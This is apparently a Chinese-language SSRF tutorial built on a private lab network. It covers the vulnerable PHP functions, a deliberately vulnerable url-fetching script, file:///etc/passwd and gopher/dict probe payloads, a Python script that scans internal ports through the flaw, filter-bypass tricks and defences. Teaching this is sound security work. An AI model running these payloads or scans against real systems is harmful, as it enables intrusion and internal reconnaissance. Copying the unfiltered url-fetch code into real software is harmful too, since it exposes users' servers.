[TOC]



# ==SSRF服务器请求伪造==

## 一、SSRF漏洞概述

SSRF（Server-Side Request Forgery：服务器端请求伪造）其形成的原因大都是由于服务器端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格的过滤与限制。导致攻击者可以传入任意地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。

```
数据流：攻击者 ---> 服务器 ---> 目标地址
```

通俗的来说就是我们可以“伪造”服务器端发起的请求，从而获取客户端所不能得到的数据。



## 二、SSRF常见的函数

```php
file_get_contents();
fsockopen();
curl_exec();
```

这些函数的共同特点就是通过一些网络协议去远程访问目标服务器上的资源，然后对资源进行处理。

### 1、`file_get_contents()`

```php
//直接访问一个URL地址，并输出结果
$resp = file_get_contens("http://192.168.230.147/security/login.html");
echo $resp;
```

- 比如我写一个页面，命名为 ssrf.php ，内容如下

  ![image-20240816175858332](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240816175858332.png)

  ![image-20240816175929519](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240816175929519.png)

### 2、fsockopen()

```php
<?php
//实例化一个到 www.woniuxy.com:80 的链接，超时时间30秒
$fp = fsockopen("192.168.230.150",80,$errno,$errstr,30);
// $fp = fsockopen("www.woniuxy.com",80,$errno,$errstr,30);
//拼接HTTP请求头
$out = "GET /login.html HTTP/1.1\r\n";
//$out .= "GET book/reading/221 HTTP/1.1\r\n";
$out .= "HOST: 192.168.230.150\r\n";
$out .= "Connection: Close\r\n\r\n";
//将请求头写入$fp实例并发送
fwrite($fp,$out);
//按行读取响应并输出
while (!feof($fp)) {
    echo fgets($fp,1024);
}
fclose($fp);
?>
```

访问 http://192.168.230.147/security/ssrf.php，得到：

![image-20240816182252089](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240816182252089.png)

这是什么玩意，以前怎么没有，Fiddler抓包查看内容

![image-20240816182608858](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240816182608858.png)

![image-20240816182800707](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240816182800707.png)

我们可以看到，访问一个ssrf.php 的响应中，有两个响应头，通过对比，下面第二个响应头就是输出在页面的响应头，这是为什么呢？

实际上第一个响应头是访问 ssrf.php 的响应头，第二个是代码GET请求访问 192.168.230.150/login.html 的响应头

### 3、exec()发送GET请求

```php
<?php
//创建一个CURL资源
$ch = curl_init();
//设置URL和相应的选项
curl_setopt($ch,CURLOPT_URL,"http://192.168.230.150/login.html");
curl_setopt($ch,CURLOPT_HEADER,0); 
//1 表示获取访问http://192.168.230.150/login.html的响应头；0 表示不获取（获取页面上可以看到，不获取页面上看不到）
//抓取URL并把它传递给浏览器
curl_exec($ch);
//关闭CURL资源，并且释放系统资源
curl_close();
?>
```

![image-20240816184219512](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240816184219512.png)

但事实上，我在192.168.230.150/login.html 中更换了背景图片为

![image-20240816192922742](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240816192922742.png)

那为什么访问这个依旧是原来的背景图片呢，是因为程序依旧是将请求回来的响应作为自己的代码运行，而刚好我本地对应的目录下由原来的这张图片

### 4、exec()发送POST请求

```php
<?php
$url = "http://192.168.230.147/security/login_2.php";
$data = "username=ymqyyds&password=p-0p-0p-0&vericode=0000";

$ch = curl_init();
$params[CURLOPT_URL] = $url;     //请求URL地址
$params[CURLOPT_HEADER] = true;  //是否返回响应头信息
$params[CURLOPT_RETURNTRANSFER] = true;  //是否将结果返回
$params[CURLOPT_FOLLOWLOCATION] = false; //是否重定向
$params[CURLOPT_TIMEOUT] = 30;   //超时时间
$params[CURLOPT_POST] = true;    //是否为POST请求
$params[CURLOPT_POSTFIELDS] = $data;     //给POST请求正文赋值
$params[CURLOPT_SSL_VERIFYPEER] = false; //请求https时，不验证证书
$params[CURLOPT_SSL_VERIFYHOST] = false; //请求https时，不验证主机

curl_setopt_array($ch,$params);  //传入CURL参数
$content = curl_exec($ch);
curl_close($ch);                 //关闭连接
?>
```

![image-20240816185926235](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240816185926235.png)

如果设置 `$params[CURLOPT_HEADER] = false;` ，则

![image-20240816190324193](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240816190324193.png)

## 三、SSRF主要危害

SSRF利用条件：URL地址可控，后台页面没有对URL进行正确的校验，在页面中最好有输出

（1）可以对外网，服务器所在的内网，本地进行端口扫描，获取一些服务器信息

（2）攻击运行在内网或本地的应用程序（比如溢出）

（3）对内网Web应用进行指纹识别，通过访问默认文件实现；

（4）攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts

2漏洞利用，SQL注入等）；

（5）利用file，dict，gopher，http，https等协议读取本地文件，访问敏感目标，反弹shell等高位操作

### 1、先准备以下脚本

```php
<?php
$url = $_GET['url'];
$resp = file_get_contents($url);
echo $resp;
// //或使用以下方式
// $ch = curl_init();
// curl_setopt($ch,CURLOPT_URL,$_GET['url']);
// curl_setopt($ch,CURLOPT_HEADER,0);
// $content = curl_exec($ch);
// echo $content;
// curl_close($ch);
?>
```

### 2、读取文件和信息

- `file://`

> file://用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响file://协议主要用于访问文件(绝对路径、相对路径以及网络路径)比如：http://www.xx.com?file=file:///etc/passsword
>

![image-20240816195441036](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240816195441036.png)

> 注意，这里访问时，使用`file://../../../../etc/passwd` 是错误的，但是使用 `file:///../../../etc/passwd` 就是正确的，也就是说不管如何，在 file:// 后再加一个 / 才是正确的用法。使用 `file:///etc/passwd` 也是正确的
>
> ![image-20240816195838668](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240816195838668.png)

- 远程读取访问

![image-20240816200154302](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240816200154302.png)

http://192.168.230.150

![image-20240816200223135](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240816200223135.png)

http://192.168.230.150:88

![image-20240816200239522](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240816200239522.png)

http://192.168.230.150:81

![image-20240816200258587](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240816200258587.png)

- `php://filter/read=convert.base64-encode/resource`

![image-20240816225950462](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240816225950462.png)

### 3、内网扫描

（1）使用burp遍历IP地址或端口完成扫描

举个例子：通过端口扫描内网存活主机

![image-20240816231718902](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240816231718902.png)

![image-20240816231739052](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240816231739052.png)

![image-20240816231755643](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240816231755643.png)

（2）使用Python代码进行类似的扫描

```python
import time,requests

def port_scan():
    for i in range(1,256):
        url = f"http://192.168.230.147/security/ssrf.php?url=http://192.168.230.150:{i}"
        # url = f"http://192.168.230.147/security/ssrf.php?url=http://192.168.230.15"
        resp = requests.get(url)
        # print(resp.text)
        time.sleep(0.8)
        print(f"192.168.230.150:{i} 正在扫描")
        if ("file_get_contents" not in resp.text) or ("Warning" not in resp.text):
            print(f"192.168.230.150:{i}在线")

def url_scan():
    for i in range(1,255):
        for j in range(1,255):
            url = f"http://192.168.230.147/security/ssrf.php?url=http://192.168.{i}.{j}:80"
            try:
                resp = requests.get(url=url,timeout=1)
                print(f"192.168.{i}.{j}:80 正在扫描")
                time.sleep(0.8)
                if ("file_get_contents" not in resp.text) or ("Warning" not in resp.text):
                    print(f"192.168.{i}.{j}:80   在线")
            except:
                pass

if __name__ == '__main__':
    # port_scan()
    url_scan()

```

由于并不知道正确访问到的响应是怎样的，不同服务，响应不同，所以无法通过响应来判断是，只能够通过响应判断不是

> 真实情况我们需要扫描A B C类，三类IP地址，甚至包括端口号也要带上，所以总的下来我们所需发送的请求还挺多的
>
> **并且，这段代码只是基于后台使用的是`file_get_contents`函数才可以使用，如果后台使用curl_exec的方式，我们就需要先区分curl_exec模式下，正常访问和访问不到时二者的区别，基于此再做判断条件**
>
> **甚至有些端口即使开放，但访问时依旧没有任何回显，比如 php-fpm 的默认9000端口，用于与nginx通信的服务，此时我们可以通过响应的状态码来作为判断条件**

### 4、获取指纹信息

根据扫描结果，进一步实现内网访问，进而获取服务器指纹信息，规划下一步攻击方案

```
url=gopher://192.168.230.15:22
url=dict://192.168.230.15:3306
url=http://192.168.230.15:22
```

通过使用三种协议，去访问服务器的不同服务，根据响应情况来判断服务器是否开启对应的服务，有时候会暴露服务器的指纹信息

![image-20240817154552010](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240817154552010.png)

![image-20240817154605900](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240817154605900.png)

![image-20240817154615005](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240817154615005.png)

![image-20240817154636630](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240817154636630.png)

> 而且进一步可以利用Gopher协议，可以生成基于MySQL和Redis等的RCE的Payload，过程可以去网上搜搜

## 四、SSRF漏洞挖掘技巧

### 1、从URL中寻找特殊字段

url地址参数一般程序员命名都是符合单词含义的，所以通过在URL中寻找特殊关键词，可以判断是否存在SSR（Server-Side Request）

又因为正常情况下，服务器的请求都是普普通通的，而一些包含了特殊关键字的请求URL就显得很另类了，也许程序员一不小心就留下了F（Forgery）

```
share
wap
url
link
src
source
target
u
3g
display
sourceURI
imageURL
domain
location
remote
...
```

### 2、从Web页面功能上寻找

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20240817155822286.png" alt="image-20240817155822286" style="zoom:150%;" />

## 五、SSRF的判断方法

SSRF根据业务功能不同，返回的内容也会有区别，大致分为三类：

```
完全回显：可以通过会先信息来判断是否存在漏洞
半回显：虽然不能完全回显出信息，但是也能显示出title，图片等有价值的信息
无回显：需要向忙著那样用其他方法尝试确认漏洞的存在
```

遇到无回显的时候，怎么去判定是否存在SSRF呢

- DNSlog
- 租用公网服务器，查看访问日志
- 时间型盲注

[**SSRF在有无回显方面的利用及其思考与总结 - 先知社区 (aliyun.com)**](https://xz.aliyun.com/t/6373?time__1311=n4%2BxnD0Dg73YwqCq0KDsA3oSDuD02wYexhuoTD)

## 六、SSRF利用方式

gopher:// 

dict://

file://

http://

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20240817160958648.png" alt="image-20240817160958648" style="zoom:150%;" />

## 七、SSRF绕过技巧

### 1、将IP地址转换为十进制

在网上找这样的在线工具[IP地址转换器_IP地址转二进制、十进制、十六进制工具 - 站长工具网 (zhanid.com)](https://www.zhanid.com/tool/ipconvert.html)

进行IP地址转换，比如：http://192.168.230.150  -》 http://3232294550

![image-20240817161535611](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240817161535611.png)

当然，这种情况有时候没法，因为后台使用的用于接收url参数的函数可能不接受这样的地址，然后访问会失败，但是这样的十进制IP地址在浏览器中直接访问就可以，会自动跳转为点分十进制，但是SSRF中就可能不支持了

![image-20240817162023180](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240817162023180.png)

### 2、重新构造URL地址

后台代码如果对URL地址进行处理，比如

用户访问 `?url=http://192.168.230.150` 后台会以 // 作为分隔符，然后取出 192.168.230.150，并判断该ip地址所在的网段 192.168 是否属于白名单网段，此时我们可以通过构造IP地址来绕过

比如 `?url=http://www.woniuxy.com@192.168.230.150/login.html` 最终访问到的页面还是 login.html

![image-20240817162637723](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240817162637723.png)

### 3、使用短网址，这个只需要付费就可以使用，转换后直接拿来用就好了

## 八、SSRF防御

（1）限制协议为 HTTP:// HTTPS:// ，不允许其他协议

```php
if(stripos($url,"http") === false || stripos($url,"http") > 0){
    die("URL_ERROR");
}
// stripos($source,$sub) 
// 如果在$source中找到了$sub，那么就返回$sub所在下标的开始位置
// 如果此时$sub刚好在$source的开头，那么将会返回 0 ，但是 PHP中 0==false 是成立的，所以需要用 === 强制等，确保类型也要相等
// 如果没找到，那么就返回false
```

（2）设置URL或IP地址白名单，非白名单不允许访问

（3）限制内网IP访问，比如URL地址不能以10.0  172.16  192.168  开头等

不过这样的方式可以通过构造URL地址来绕过，比如：

```
?url=http://www.woniuxy.com@192.168.230.150/login.html
```

其中 http://www.woniuxy.com 可以访问，但 192.168.230.150 不允许访问，通过这样构造就使得访问到了 192.168.230.150

（4）统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态，或直接禁用错误消息

```php
error_reporting(0)
或在所调用函数前加 @
```

（5）禁止重定向操作（服务器端 客户端 均需要过滤）

使用重定向可以直接跳转到目标URL地址页面，可用于构造钓鱼网站等操作，需要避免

<img src="https://gitee.com/ymq_typroa/typroa/raw/main/image-20240817164827887.png" alt="image-20240817164827887" style="zoom:150%;" />

（6）限制请求的端口，比如80，443，8080，8090

（7）后台服务器最好禁止远程用户指定请求参数，让参数不可控

（8）如果一定要通过后台服务器去对用户指定（“或者预埋在前端的请求”）的地址进行资源请求，那么一定要做好目标地址的过滤。

（9）服务器需要认证交互，禁止非正常用户访问服务，杜绝伪造请求，例如Token技术

